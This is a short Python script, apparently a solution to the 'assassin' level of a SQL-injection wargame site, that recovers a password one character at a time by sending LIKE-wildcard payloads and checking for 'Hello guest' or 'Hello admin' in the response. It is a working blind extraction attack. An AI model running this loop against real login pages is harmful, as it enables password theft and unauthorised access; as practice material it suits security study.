import requests

requests.packages.urllib3.disable_warnings()
sess = requests.session()
URL = 'https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php'
headers = {'Cookie': ''}
Password = ''
for j in range(1, 100):
    for i in range(48, 128):
        payload = "?pw="+Password+chr(i)+"%"
        res = sess.get(url=URL + payload, headers=headers, verify=False)
        if 'Hello guest' in res.text:
            if(ord('9')< i < ord('a')):
                pass
            else:
                print("Password %d: %d = " %(j, i))
                print(chr(i))
                Password = Password + chr(i)
                break

        elif'Hello admin' in res.text:
            Password = Password + chr(i)
            print(Password)
            break
        else:
            pass
    if'Hello admin' in res.text:
        break

